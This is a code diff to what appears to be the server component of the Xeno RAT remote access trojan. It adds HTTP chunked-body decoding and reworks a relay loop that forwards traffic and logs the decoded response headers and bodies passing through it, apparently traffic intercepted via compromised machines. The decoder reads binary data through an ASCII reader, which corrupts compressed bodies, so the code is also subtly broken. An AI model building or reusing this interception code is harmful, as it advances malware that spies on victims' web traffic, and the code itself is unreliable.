@@ -1547,6 +1547,29 @@ namespace xeno_rat_server.Forms
             }
             return data.Length == 0 ? false : (printable / (double)data.Length) > 0.9;
         }
+        private static byte[] DecodeChunkedBody(byte[] data)
+        {
+            using (var input = new MemoryStream(data))
+            using (var output = new MemoryStream())
+            using (var reader = new StreamReader(input, Encoding.ASCII))
+            {
+                while (true)
+                {
+                    string line = reader.ReadLine();
+                    if (line == null) break;
+                    int chunkSize = int.Parse(line.Split(';')[0], System.Globalization.NumberStyles.HexNumber);
+                    if (chunkSize == 0) break;
+
+                    var buffer = new char[chunkSize];
+                    int read = reader.ReadBlock(buffer, 0, chunkSize);
+                    output.Write(Encoding.ASCII.GetBytes(buffer, 0, read), 0, read);
+
+                    // skip CRLF
+                    reader.ReadLine();
+                }
+                return output.ToArray();
+            }
+        }
 
         private static byte[] TryDecodeChunked(byte[] data)
         {
@@ -2127,7 +2150,7 @@ namespace xeno_rat_server.Forms
 
                         if (bytesRead <= 0) break;
 
-                        // Immediately relay bytes
+                        // Relay to destination
                         try
                         {
                             await dst.WriteAsync(buf, 0, bytesRead, ct).ConfigureAwait(false);
@@ -2139,31 +2162,34 @@ namespace xeno_rat_server.Forms
                             break;
                         }
 
-                        if (isRequest) continue; // Only log responses
+                        if (isRequest)
+                            continue; // Skip request body capture
 
-                        // Accumulate header until full header found
+                        // Accumulate header until parsed
                         if (!headersParsed)
                         {
                             headerBuf.Write(buf, 0, bytesRead);
-                            var headersText = TryExtractHeaders(headerBuf.ToArray(), out int headersLength);
+                            string headersText = TryExtractHeaders(headerBuf.ToArray(), out int headersLength);
                             if (headersText == null)
-                                continue; // still waiting for more data
+                                continue; // not complete yet
 
                             headersParsed = true;
                             _log($"HTTP response detected:\n{Truncate(headersText, 1000)}");
 
-                            // Detect encoding and length
-                            var matchLength = Regex.Match(headersText, @"Content-Length:\s*(\d+)", RegexOptions.IgnoreCase);
-                            if (matchLength.Success)
-                                contentLength = long.Parse(matchLength.Groups[1].Value);
+                            // Detect Content-Length
+                            var matchLen = Regex.Match(headersText, @"Content-Length:\s*(\d+)", RegexOptions.IgnoreCase);
+                            if (matchLen.Success)
+                                contentLength = long.Parse(matchLen.Groups[1].Value);
 
+                            // Detect Transfer-Encoding: chunked
                             isChunked = headersText.IndexOf("Transfer-Encoding: chunked", StringComparison.OrdinalIgnoreCase) >= 0;
 
-                            var matchEncoding = Regex.Match(headersText, @"Content-Encoding:\s*(\S+)", RegexOptions.IgnoreCase);
-                            if (matchEncoding.Success)
-                                contentEncoding = matchEncoding.Groups[1].Value.ToLowerInvariant();
+                            // Detect Content-Encoding
+                            var matchEnc = Regex.Match(headersText, @"Content-Encoding:\s*(\S+)", RegexOptions.IgnoreCase);
+                            if (matchEnc.Success)
+                                contentEncoding = matchEnc.Groups[1].Value.ToLowerInvariant();
 
-                            // Create new body buffer, copy any remaining bytes
+                            // Create new buffer for body
                             bodyBuf = new MemoryStream();
                             if (headerBuf.Length > headersLength)
                             {
@@ -2179,39 +2205,79 @@ namespace xeno_rat_server.Forms
                             bodyBuf.Write(buf, 0, bytesRead);
                         }
 
-                        // Stop reading early if we reached content-length
+                        // Stop when full body received
                         if (contentLength.HasValue && bodyBuf != null && bodyBuf.Length >= contentLength.Value)
                             break;
+
+                        // If chunked, try to detect end of last chunk ("0\r\n\r\n")
+                        if (isChunked && bodyBuf != null)
+                        {
+                            var data = bodyBuf.ToArray();
+                            if (data.Length >= 5 &&
+                                data[data.Length - 5] == '0' &&
+                                data[data.Length - 4] == '\r' &&
+                                data[data.Length - 3] == '\n' &&
+                                data[data.Length - 2] == '\r' &&
+                                data[data.Length - 1] == '\n')
+                            {
+                                break; // End of chunked transfer
+                            }
+                        }
                     }
 
-                    // At this point: bodyBuf may have full response
+                    // Decode & log body
                     if (!isRequest && bodyBuf != null && bodyBuf.Length > 0)
                     {
                         bodyBuf.Position = 0;
-                        Stream decodeStream = bodyBuf;
+                        byte[] bodyBytes = bodyBuf.ToArray();
 
-                        try
+                        if (isChunked)
                         {
-                            if (!string.IsNullOrEmpty(contentEncoding))
+                            try
                             {
-                                if (contentEncoding == "gzip")
-                                    decodeStream = new GZipStream(bodyBuf, CompressionMode.Decompress);
-                                else if (contentEncoding == "deflate")
-                                    decodeStream = new DeflateStream(bodyBuf, CompressionMode.Decompress);
-                                else if (contentEncoding == "br")
-                                    decodeStream = new BrotliSharpLib.BrotliStream(bodyBuf, CompressionMode.Decompress);
+                                bodyBytes = DecodeChunkedBody(bodyBytes);
                             }
-
-                            using (var reader = new StreamReader(decodeStream, Encoding.UTF8, detectEncodingFromByteOrderMarks: true))
+                            catch (Exception ex)
                             {
-                                string bodyText = await reader.ReadToEndAsync().ConfigureAwait(false);
-                                if (!string.IsNullOrEmpty(bodyText))
-                                    _log($"HTTP response body (decoded, truncated):\n{Truncate(bodyText, 2000)}");
+                                _log($"Failed to decode chunked body: {ex.Message}");
                             }
                         }
-                        catch (Exception ex)
+
+                        using (var ms = new MemoryStream(bodyBytes))
                         {
-                            _log($"Failed to read response body: {ex.Message}");
+                            Stream decodeStream = ms;
+
+                            if (!string.IsNullOrEmpty(contentEncoding))
+                            {
+                                try
+                                {
+                                    if (contentEncoding == "gzip")
+                                        decodeStream = new GZipStream(ms, CompressionMode.Decompress);
+                                    else if (contentEncoding == "deflate")
+                                        decodeStream = new DeflateStream(ms, CompressionMode.Decompress);
+                                    else if (contentEncoding == "br")
+                                        decodeStream = new BrotliSharpLib.BrotliStream(ms, CompressionMode.Decompress);
+                                }
+                                catch (Exception ex)
+                                {
+                                    _log($"Failed to create decode stream for {contentEncoding}: {ex.Message}");
+                                    decodeStream = ms; // fallback raw bytes
+                                }
+                            }
+
+                            try
+                            {
+                                using (var reader = new StreamReader(decodeStream, Encoding.UTF8, true))
+                                {
+                                    string bodyText = await reader.ReadToEndAsync().ConfigureAwait(false);
+                                    if (!string.IsNullOrEmpty(bodyText))
+                                        _log($"HTTP response body (decoded, truncated):\n{Truncate(bodyText, 2000)}");
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                _log($"Failed to read response body: {ex.Message}");
+                            }
                         }
                     }
                 }
